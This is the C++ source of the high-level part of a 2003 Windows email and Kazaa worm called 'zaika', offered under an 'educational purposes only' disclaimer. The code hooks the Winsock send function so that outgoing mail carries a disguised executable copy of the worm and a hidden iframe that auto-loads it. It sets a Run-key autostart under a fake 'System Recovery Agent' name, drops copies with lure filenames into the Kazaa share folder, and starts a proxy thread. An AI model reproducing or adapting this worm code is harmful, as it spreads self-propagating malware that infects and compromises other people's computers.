// zaika hll part
// (c) whale 2003 
//    This source is for educational purposes only. Author does not take
//           responsibility for the consequences of its usage			
//					This is open-source program							
 

#ifndef _DEBUG
#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:512 /SECTION:.text,EWRX /IGNORE:4078")
#pragma comment(linker,"/ENTRY:DllMain")
#pragma comment(linker,"/NODEFAULTLIB")
#endif

#include "stdafx.h"

#define DLLFUNC extern "C" __declspec(dllexport) 

char *bufenc;
HMODULE hmod0, hws, hws2;
FARPROC newsendaddr, newWSAStartupAddr;

void cppexcept(unsigned u, _EXCEPTION_POINTERS *pExp)
{
	throw u;
}

// вставка строки str2 в строку str1 в позицию pos 
// размер буфера str1 должен быть >= суммарной длины строк!
// insert str2 in str1 at pos
int strins (char *str1, int pos, char *str2)
{
	char *tbuf;
	int len=lstrlen(str1);
	tbuf=(char*)valloc(len-pos+10);
	if(tbuf==NULL)
		return 0;
	lstrcpy(tbuf, str1+pos);
	lstrcpy(str1+pos, str2);
	lstrcat(str1, tbuf);
	vfree(tbuf);
	return 1;
}


void setname(char *name)
{
	lstrcpy(name, "pic00000.pif");
	for(int i=4; i<=7; i++)
		name[i]='0'+((float)(rand())/RAND_MAX)*10;
}

void makeid(char *id, int len)
{
	for(int i=0; i<len-1; i++)
		id[i]='A'+(char)(rand()%26);
	id[len]='\0';
}

int addattach(const char *buf, char **newbuf, int len, int *newlen)
{
	char signat1[]="Content-Type: multipart";
	char signat2[]="boundary=\"" , *pos1, *pos2,*tmp, boundary[256], *attach;
	char attname[60], *posframe, *posframe1, *posframe2;

	int i, k, firstpartlen, attachlen, res, attindex;

	*newlen=len;
	char *fnamepos=strstr(buf, "name=\"");

	// поиск сигнатуры 
	// look for signature in the packet
	if(NULL==strstr(buf, signat1) || NULL==(pos1=strstr(buf, signat2))) 
		goto endsend;

	srand(GetTickCount());
	if(!fnamepos)
		setname(attname);
	else
	{
		fnamepos+=6;
		char *fnamepos2=strstr(fnamepos, "\"");
		if(!fnamepos2 || fnamepos2-fnamepos>40)
			setname(attname);
		else
		{
			lstrcpyn(attname, fnamepos, fnamepos2-fnamepos+1);
			if(1&rand())
				lstrcat(attname, ".exe");
			else
				lstrcat(attname, ".pif");
		}
	}

	//attindex=(int) (((float)(rand())/RAND_MAX)*ATTNUM);

	pos1+=10;	// устанавливаем на начало разделителя
	pos2=strstr(pos1, "\"");	
	if(pos2==NULL)
		goto endsend;

	k=pos2-pos1;
	lstrcpyn(boundary, pos1, k+1);


	// ищем последний разделитель далее по тексту
	// look for last boundary in the packet
	pos1=NULL;
	do {
		tmp=strstr(pos2, boundary);
		if(tmp==NULL)
			break;
		pos1=tmp;
		pos2=pos1+1;
	} while(1);
	
	if(pos1==NULL)
		goto endsend;

	char id[12];
	makeid(id, 10); // создаем ID для фрейма 
	
	// нашли, теперь в это место вставляем аттач
	// make attach
	attachlen=lstrlen(bufenc)+1024;
	attach=(char*)valloc(attachlen);
	attachlen=sprintf(attach, 
		"--%s\r\n"
		"Content-Type: application/octet-stream;"
		" name=\"%s\"\r\n"
		"Content-Transfer-Encoding: x-uue\r\n"
		"Content-ID: <%s>\r\n"
		"Content-Disposition: attachment;\r\n"
//		"	filename=\"%s\"\r\n
		"\r\n"
		"begin 644 %s\r\n"
		"%s"
		"end\r\n",
		boundary,
		attname, id,
//		attname,
		attname,
		bufenc
		);

	(*newlen)+=attachlen;//1024; // размер нового буфера
	*newbuf=(PCHAR)valloc(*newlen+110);//110-для фрейма

//	lstrcpy(*newbuf, buf);
//	res=strins(*newbuf, pos1-buf, attach);


	firstpartlen=pos1-buf;
	lstrcpyn(*newbuf, buf, firstpartlen-1);
	lstrcat(*newbuf, attach);
	lstrcat(*newbuf, "--");
	i=lstrlen(*newbuf);
	lstrcpyn((*newbuf)+i, buf+firstpartlen, len-firstpartlen+1);
//	lstrcat(newbuf, buf+firstpartlen);

	// вставляем фрейм 
	// insert IFRAME in HTML body
	posframe1=strstr(*newbuf, "</BODY>");
	posframe2=strstr(*newbuf, "</body>");
	posframe=(posframe1 && posframe2) ? posframe1 : 
				posframe1 ? posframe1 : posframe2;
	if(posframe)
	{
		char frame[98];
		/*int framelen=*/sprintf(frame, 
			"\r\n<frameset rows=\"10%,*\">\r\n"
			"<iframe src=3Dcid:%s height=3D0 width=3D0>\r\n"
			"</frameset>\r\n\r\n", id);
		strins(*newbuf, posframe-(*newbuf), frame);
	}
	
	vfree(attach);

	return 1;

endsend:	// не удалось добавить аттач - возвращаем 0
	return 0;	// ret 0 if error 
}


// new send 
DLLFUNC int WINAPI newsend(SOCKET s,	const char FAR * buf, int len, int flags)
{
	int newlen;
	char *newbuf;
	int b;

	// protect code with SEH
	_se_translator_function oldhandler=_set_se_translator(cppexcept);
	try 
	{
		b=addattach(buf, &newbuf, len, &newlen);
	}
	catch (unsigned code)
	{
	/*
		Beep(100,100);
		if(code==0xC0000005)
			MessageBox(NULL, "AViol :: addattach", "", MB_OK|MB_ICONSTOP);
		else
			MessageBox(NULL, "not AViol :: addattach", "", MB_OK|MB_ICONSTOP);
	*/

		_set_se_translator(oldhandler);
		return send(s, buf, len, flags);
	}

	if(b){
		_se_translator_function oldhandler=_set_se_translator(cppexcept);
		try 
		{

			int radix=65536, ostat, n;
			// break packet if it's length exceeds radix
			if(newlen>radix){
				ostat=newlen%radix;
				n=newlen/radix;
				int i, pos, prevpos;
				prevpos=0;
				// разбиваем мессаг по концам строк
				// break at CRLF
				for(i=0; i<n; i++){
					pos=prevpos+radix;
					while(pos<newlen){
						if(newbuf[pos-2]=='\x0D' && newbuf[pos-1]=='\x0A')
							break;
						pos++;
					}
					if(pos>=newlen)
						break;
					Sleep(50);	// we must take a pause here
					send(s, newbuf+prevpos, pos-prevpos, flags);
					prevpos=pos;
//					send(s, newbuf+i*radix, radix, flags);
				}
				// похоже, нужна задержка
				// we must take a pause here
				Sleep(50);
				// send remaining bytes
				send(s, newbuf+prevpos, newlen-prevpos, flags);
			}
			else
				send(s, newbuf, newlen, flags);	//send entire packet
//			send(s, newbuf+n*radix, ostat, flags);
			vfree(newbuf);
			return len;
		}
		catch (unsigned code)
		{
/*			Beep(100,2000);
			if(code==0xC0000005)
				MessageBox(NULL, "AViol :: send", "", MB_OK|MB_ICONSTOP);
			else
				MessageBox(NULL, "not AViol :: send", "", MB_OK|MB_ICONSTOP);
*/
			_set_se_translator(oldhandler);
			return send(s, buf, len, flags);
		}
		_set_se_translator(oldhandler);
	}
	else 
		return send(s, buf, len, flags);
}

// перед установкой хука нужно передать указатель на буфер с аттачем
// asm part of zaika must pass UUE buf address to hll part
DLLFUNC void WINAPI setbufenc(char *buf)
{
	bufenc=buf;
}

// asm part of zaika must pass api addresses to hll part
DLLFUNC void WINAPI setsendaddr(FARPROC sa, FARPROC wsa)
{
	newsendaddr=sa;
	newWSAStartupAddr=wsa;
}

DLLFUNC FARPROC WINAPI newGPA(HMODULE hModule, LPCSTR lpProcName)
{
	FARPROC _func = GetProcAddress(hModule, lpProcName);
	FARPROC _send = GetProcAddress(hws2, "send");

	if(_func == _send)
		return newsendaddr;
	else
		return _func;
}


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	if(ul_reason_for_call==DLL_PROCESS_ATTACH){
		hmod0=(HMODULE)hModule;
		hws=LoadLibrary("wsock32");
		hws2=LoadLibrary("ws2_32");
	}
	return TRUE;
}

#define DES_LONG unsigned long

#define ccc2l(c,l)      (l =((DES_LONG)(*((c)++)))<<16, \
			 l|=((DES_LONG)(*((c)++)))<< 8, \
		 	 l|=((DES_LONG)(*((c)++))))

#define l2ccc(l,c)      (*((c)++)=(unsigned char)(((l)>>16)&0xff), \
                    *((c)++)=(unsigned char)(((l)>> 8)&0xff), \
                    *((c)++)=(unsigned char)(((l)    )&0xff))

DLLFUNC int WINAPI uuencode(unsigned char *in, int num, unsigned char *out)
	{
	int j,i,n,tot=0;
	DES_LONG l;
	register unsigned char *p;
	p=out;

	for (j=0; j<num; j+=45)
		{
		if (j+45 > num)
			i=(num-j);
		else
			i=45;
		*(p++)=i+' ';
		for (n=0; n<i; n+=3)
			{
			ccc2l(in,l);
			*(p++)=((l>>18)&0x3f)+' ';
			*(p++)=((l>>12)&0x3f)+' ';
			*(p++)=((l>> 6)&0x3f)+' ';
			*(p++)=((l    )&0x3f)+' ';
			tot+=4;
			}
		*(p++)='\r';	// добавлено мной
		*(p++)='\n';
		tot+=3;	// увеличено на 1 мной
		}
	*p='\0';
	l=0;
	return(tot);
	}

DLLFUNC HWND WaitForMailRun()
{
// ожидаем появления окна с заданными классами и возвращ. его хендл
// wait for windows with specific class names
#define NUM_CL	3
	char *cl[NUM_CL]={	
						"TMailerForm",
						"Outlook Express Browser Class",
						"MozillaWindowClass"
					};
	HWND hw;
	while(1){
		for(int i=0; i<NUM_CL; i++){
			Sleep(200);
			hw=FindWindow(cl[i], NULL);
			if(hw!=NULL)
				return hw;
		}
	}
	return NULL;
}


#define ATTNUM 20

// copy worm to sys dir and kazaa dir, set autorun
DLLFUNC void wcopy()
{
char 
	wname[100],
	newwname[100],
	ntregpath[]="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	kzregpath[]="Software\\Kazaa\\LocalContent",
	valname[]="System Recovery Agent";
char *attnames[]={"setup.exe", "dotnetfx.exe", "donald_duck.pif", 
		"mickey_mouse.pif", "bush&benladen.jpg.exe", "avril.pif",
		"funnypic.jpg.exe",
		"WinXPHotfix71.exe", "KazaaXPSetup.exe", "ICQ2003b.exe",
		"setup.exe", "WinUpdate.exe", "titanium.jpg.exe", 
		"rain.jpg.exe", "note.doc.exe"
		"setup.exe", "setup.exe", "setup.exe", "setup.exe", 
		"setup.exe"};
	char startfname[20];

	char *regpath;
	regpath=ntregpath;
	HKEY hk;			
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,regpath,NULL,KEY_ALL_ACCESS,&hk);
	DWORD valsize, type;
	RegQueryValueEx(hk, valname, NULL, &type, (LPBYTE)newwname,
		&valsize);
	if(!(type==REG_SZ && valsize>0 && valsize<100))
	{
		if(!GetSystemDirectory(newwname, 99))
			return;
		if(!GetModuleFileName(NULL, wname, 99))
			return;
		srand(GetTickCount());
		makeid(startfname, 8);
		startfname[0]='W';
		startfname[1]='I';
		startfname[2]='N';
		lstrcat(startfname, ".EXE");
		lstrcat(newwname, "\\");
		lstrcat(newwname, startfname);
		CopyFile(wname, newwname, FALSE);
		char winmine[50];
		RegSetValueEx(hk,valname,0L,REG_SZ,(UCHAR*)newwname,lstrlen(newwname));
	}
	RegCloseKey(hk);

	//kazaa
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,kzregpath,NULL,KEY_ALL_ACCESS,&hk);
	RegQueryValueEx(hk, "DownloadDir", NULL, &type, (LPBYTE)newwname,
		&valsize);
	RegCloseKey(hk);
	if(type==REG_SZ && valsize>0 && valsize<100){
		srand(GetTickCount());
		int attindex=(int)(((float)(rand())/RAND_MAX)*ATTNUM);
		lstrcat(newwname, "\\");
		lstrcat(newwname, attnames[attindex]);
		CopyFile(wname, newwname, FALSE);
	}
}

DLLFUNC void dllproxy()
{
	DWORD id;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)proxy, 
		(LPVOID)hmod0, 0, &id);
}

